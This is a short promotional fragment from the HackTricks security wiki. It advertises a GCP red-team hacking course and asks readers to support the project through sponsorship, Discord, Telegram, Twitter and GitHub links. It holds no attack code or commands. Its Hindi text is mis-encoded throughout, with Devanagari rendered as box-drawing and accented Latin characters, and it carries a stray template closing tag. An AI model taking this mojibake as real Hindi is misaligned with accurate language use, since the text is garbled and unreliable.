GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **Twitter** рдкрд░ рд╣рдореЗрдВ **рдлреЙрд▓реЛ рдХрд░реЗрдВ** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдЧрд┐рдЯрд╣рдм рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдореЗрдВ PR рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВред

</details>
{% endhint %}
